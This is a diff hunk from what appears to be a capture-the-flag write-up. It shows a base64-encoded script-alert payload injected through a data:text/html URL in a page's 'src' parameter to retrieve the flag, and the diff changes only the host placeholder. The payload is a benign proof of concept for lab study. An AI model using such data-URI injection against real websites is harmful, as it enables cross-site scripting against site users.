@@ -8,7 +8,7 @@ We base64 the following :
 <script>alert("coucou");</script>
 -> PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+
 
-http://--ip--/?page=media&src=data:text/html;base64PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+
+http://local_IP/?page=media&src=data:text/html;base64PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+
 
 and we get the flag.
 
